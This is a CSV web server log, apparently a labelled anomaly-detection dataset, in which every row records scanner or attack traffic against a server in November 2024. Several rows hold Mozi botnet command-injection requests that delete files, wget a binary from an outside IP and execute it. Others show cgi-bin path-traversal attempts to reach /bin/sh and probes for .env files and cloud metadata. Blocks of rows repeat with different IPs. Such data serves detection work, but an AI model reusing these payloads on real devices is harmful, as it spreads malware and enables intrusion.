ip,date,method,endpoint,status,size,flag
149.215.228.116,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.208.109.248,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
184.165.15.54,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
159.45.249.71,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
130.31.231.48,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
254.188.229.51,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
193.119.220.176,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
231.44.159.99,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
213.45.210.60,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
182.211.197.70,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
205.142.174.192,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
223.58.163.236,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
247.201.16.243,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
154.66.136.169,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
104.121.51.104,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
167.187.75.69,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
78.190.40.125,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
164.99.168.73,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
14.178.1.157,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
225.252.179.90,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
37.139.56.72,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
221.151.99.89,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
116.167.80.63,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
240.63.19.94,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
96.236.41.0,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
225.45.83.86,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
163.181.35.238,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
119.69.100.127,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
3.71.13.131,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
140.196.130.161,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
218.253.147.186,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
31.105.11.104,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
100.23.168.148,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
219.234.195.33,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
76.169.81.169,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
71.14.182.22,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
125.55.36.216,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
81.56.145.247,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
239.67.68.68,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
181.202.132.134,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
215.11.11.214,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
6.102.206.127,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
48.224.135.116,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
33.98.31.66,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
212.122.25.86,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
234.74.106.240,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
97.143.220.159,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
135.148.1.65,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
240.44.133.214,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
15.97.211.234,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
237.213.216.69,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
111.5.106.72,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
3.61.128.173,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
83.116.248.138,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
94.200.225.224,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
31.164.152.194,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
43.129.133.98,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
73.173.192.115,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
71.70.92.113,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
185.199.53.164,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
149.221.9.200,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
95.113.37.144,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
122.166.57.98,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
194.237.240.91,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
218.161.6.18,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
109.177.143.205,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
187.154.140.196,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
91.171.67.84,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
203.224.54.137,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
97.171.220.225,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
226.118.181.70,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
46.44.138.105,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
218.237.106.50,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
30.199.132.50,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
111.46.96.10,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
73.82.187.246,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
64.116.87.43,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
100.177.15.130,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
31.38.171.181,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
141.189.70.136,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
213.67.116.231,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
159.140.107.232,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
45.11.74.234,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
4.174.134.146,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
23.187.162.159,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
206.241.132.74,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
184.158.165.17,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
186.191.37.138,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
102.225.133.28,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
253.68.197.126,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
65.253.97.198,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
80.34.210.18,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
29.61.35.150,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
76.196.106.207,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
155.230.200.44,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
70.52.175.71,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
127.84.188.48,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
210.234.139.45,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
246.214.132.250,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
190.217.123.171,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
103.163.244.96,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
236.185.187.129,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
195.72.80.163,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
196.147.162.214,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
4.239.73.90,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
240.145.76.214,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
35.103.106.123,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
27.129.88.183,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
199.63.9.230,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
124.80.54.159,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
144.21.188.200,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
96.74.145.6,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
205.151.140.51,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
253.80.114.102,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
239.12.6.86,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
71.163.5.100,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
116.71.32.211,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
53.233.223.158,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
132.4.151.87,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
37.155.149.233,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
226.145.146.64,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
203.59.42.98,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
209.188.13.217,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
132.170.157.116,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
108.254.46.205,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
64.118.173.42,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
102.173.92.232,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
240.57.59.189,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
200.62.198.129,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
16.106.53.59,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
138.212.91.202,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
172.224.73.97,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
5.171.83.246,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
231.228.82.110,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0,anomaly
26.124.201.92,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0,anomaly
8.113.252.72,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
54.130.195.131,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0,anomaly
95.141.99.138,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
233.35.66.62,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
79.65.80.187,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
151.186.206.170,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
35.213.48.56,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0,anomaly
138.66.143.3,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0,anomaly
197.79.219.157,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0,anomaly
59.69.249.113,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0,anomaly
52.158.84.56,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
115.96.221.94,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0,anomaly
137.140.227.151,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
165.71.33.136,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
104.173.19.21,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
232.33.215.36,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
77.138.134.8,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
70.88.137.32,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
27.106.104.79,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
26.245.146.22,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0,anomaly
90.108.250.248,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0,anomaly
129.125.72.192,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
229.209.67.185,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
235.24.225.92,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
110.199.134.218,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
89.11.22.188,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0,anomaly
138.162.175.64,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0,anomaly
102.153.135.223,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0,anomaly
118.228.14.135,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
111.152.250.93,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
144.208.253.95,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
204.249.240.93,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0,anomaly
218.84.175.156,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0,anomaly
99.115.124.84,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0,anomaly
219.127.225.224,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0,anomaly
26.11.227.121,19/Nov/2024:20:16:26 +0000,,-,408,,anomaly
45.45.118.246,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0,anomaly
13.204.109.135,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0,anomaly
156.175.57.205,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0,anomaly
245.193.108.23,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0,anomaly
239.242.134.225,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0,anomaly
79.20.90.218,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0,anomaly
108.119.15.124,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0,anomaly
24.117.75.82,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
3.64.146.209,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0,anomaly
160.251.17.71,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0,anomaly
56.4.174.138,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
12.128.204.203,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0,anomaly
28.194.115.60,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0,anomaly
42.121.253.93,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0,anomaly
88.31.160.227,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0,anomaly
203.129.145.107,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0,anomaly
35.27.114.10,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
49.87.24.27,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0,anomaly
108.194.215.176,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
246.118.109.5,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0,anomaly
221.84.151.49,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0,anomaly
146.247.150.100,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0,anomaly
252.234.30.135,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0,anomaly
215.157.90.248,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0,anomaly
19.112.94.85,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
194.238.157.238,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0,anomaly
116.223.102.15,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0,anomaly
161.188.85.17,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0,anomaly
85.230.233.68,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
252.28.7.130,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
98.215.34.13,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0,anomaly
246.35.134.66,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
201.62.42.103,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
139.86.115.142,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0,anomaly
68.246.252.176,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0,anomaly
36.15.65.208,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0,anomaly
155.136.33.67,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0,anomaly
164.134.254.197,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0,anomaly
95.7.30.96,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
183.212.136.245,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
107.188.206.56,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0,anomaly
174.29.234.154,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0,anomaly
211.118.116.12,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
4.236.209.116,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
185.243.139.117,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
199.92.35.23,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
95.4.218.103,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0,anomaly
31.106.246.67,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
120.189.94.61,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0,anomaly
147.41.220.24,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0,anomaly
22.78.159.65,15/Nov/2024:00:35:31 +0000,,-,408,,anomaly
226.140.123.196,15/Nov/2024:00:36:08 +0000,,-,408,,anomaly
107.233.188.156,15/Nov/2024:00:36:30 +0000,,-,408,,anomaly
152.27.27.231,15/Nov/2024:00:36:34 +0000,,stats,400,226.0,anomaly
95.137.119.33,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
187.55.56.58,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0,anomaly
179.15.67.192,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
175.100.154.223,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
204.177.126.160,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0,anomaly
162.94.61.91,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0,anomaly
190.200.192.94,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0,anomaly
253.146.156.204,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
209.109.246.186,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0,anomaly
2.65.46.143,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
17.32.76.233,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0,anomaly
126.208.17.33,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0,anomaly
189.161.29.56,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
219.174.66.76,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
170.48.12.113,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0,anomaly
76.174.244.40,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
140.132.118.27,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0,anomaly
149.188.20.129,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0,anomaly
239.41.121.77,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0,anomaly
236.149.85.166,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0,anomaly
96.70.163.112,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
218.126.165.83,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0,anomaly
74.122.49.80,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,,anomaly
181.3.73.171,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,,anomaly
